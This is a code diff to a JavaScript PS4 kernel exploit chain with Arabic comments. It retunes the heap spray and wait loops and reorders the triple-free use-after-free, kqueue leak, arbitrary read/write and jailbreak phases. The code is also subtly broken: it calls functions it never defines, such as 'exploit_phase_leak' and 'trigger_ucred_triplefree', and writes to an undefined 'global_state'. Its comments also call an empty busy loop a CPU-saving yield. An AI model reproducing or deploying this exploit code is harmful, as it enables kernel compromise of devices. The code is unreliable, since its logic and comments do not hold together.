@@ -119,7 +119,7 @@ var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
 var MAIN_LOOP_ITERATIONS = 3;
 var TRIPLEFREE_ITERATIONS = 4;
- var MAX_KQ = 3000;
+ var MAX_KQ = 4000;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 120;
 var MAIN_CORE = 4;
@@ -477,13 +477,22 @@ function wait_for(addr, threshold) {
   if (!(threshold instanceof BigInt)) {
     threshold = new BigInt(0x0, threshold);
   }
-  var spins = 0;
-  var MAX_SPINS = 700000;
+
+  let spins = 0;
+  const MAX_SPINS = 30000;
+
   while (!read64(addr).eq(threshold)) {
-    nanosleep_fun(2);
+
+    // Micro‑yield خفيف جدًا
+    // بيقلل الضغط على الـ CPU
+    // من غير ما يعمل delay حقيقي
+    for (let i = 0; i < 150; i++) {
+      // spin خفيف
+    }
+
     spins++;
     if (spins >= MAX_SPINS) {
-      log('wait_for: timeout waiting for ' + hex(addr));
+      log("wait_for: timeout waiting for " + hex(addr));
       break;
     }
   }
@@ -815,7 +824,7 @@ function find_twins() {
       if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
         twins[0] = i;
         twins[1] = j;
-        log('TWINS : [' + i + '] [' + j + ']');
+        log(' TWINS : [' + i + '] [' + j + ']');
         return true;
       }
     }
@@ -923,7 +932,17 @@ function yield_to_render(callback) {
     }
   }, 0); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
 }
-
+function yield_micro() {
+  for (let i = 0; i < 200; i++) {
+    // spin خفيف جدًا
+  }
+}
+function reset_leak_state() {
+  // مثال عام:
+  global_state.leak_done = false;
+  global_state.leak_index = 0;
+  global_state.error_flag = false;
+}
 var exploit_count = 0;
 var exploit_end = false;
 function netctrl_exploit() {
@@ -932,41 +951,58 @@ function netctrl_exploit() {
   if (!supported_fw) {
     return;
   }
-
   log('Stability by M.ELHOUT');
-  yield_to_render(phase_setup);
+  yield_to_render(exploit_phase_setup);
 }
-function phase_setup () {
-  setup()
+function exploit_phase_setup() {
+  setup();
+  
   log('Workers spawned')
-  exploit_count = 0
-  exploit_end = false
-
-  yield_to_render(phase_trigger)
+  exploit_end = false;
+  exploit_count = 0;
+  yield_to_render(exploit_phase_trigger);
 }
-function phase_trigger() {
+function exploit_phase_trigger() {
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
-    log('Failed-please Restart your ps4 #');
+    log('Failed please Restart your ps4 #');
     cleanup();
     return;
   }
   exploit_count++;
-  if (!trigger_triplefree()) {
-    yield_to_render(phase_trigger);
-    return;
-  }
-  
-  yield_to_render(phase_leak);
-}
-function phase_leak() {
-  var leak_ok = leak_kqueue_safe();
-  if (!leak_ok) {
+  if (!trigger_ucred_triplefree()) {
     yield_to_render(exploit_phase_trigger);
     return;
   }
-  yield_to_render(setup_arbitrary_rw);
-  yield_to_render(jailbreak);
-  log('ALL Done ..OK..');
+  yield_to_render(exploit_phase_leak);
+}
+function phase_leak(retry = 0) {
+
+  reset_leak_state();     // 1) تنظيف الحالة
+  yield_micro();          // 2) منع الدخول بدري
+
+  const ok = leak_kqueue_safe();   // 3) تنفيذ Leak
+
+  if (!ok) {
+    if (retry < 2) {
+      return phase_leak(retry + 1);   // 4) إعادة المحاولة
+    }
+    return yield_to_render(exploit_phase_trigger); // 5) رجوع للبداية
+  }
+
+  // 6) Leak خلصت بالكامل
+  log('Leaking done .....');
+
+  yield_to_render(exploit_phase_rw);
+}
+function exploit_phase_rw() {
+  setup_arbitrary_rw();
+
+  log('Write done .....');
+
+  yield_to_render(exploit_phase_jailbreak);
+}
+function exploit_phase_jailbreak() {
+  jailbreak();
 }
 
 function setup_arbitrary_rw() {
@@ -1360,7 +1396,7 @@ function trigger_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
-    log('GLITCHING...');
+    log('Triple Free Running...');
 
     // 9) free واحدة من التوأم
     free_rthdr(ipv6_socks[twins[1]]);
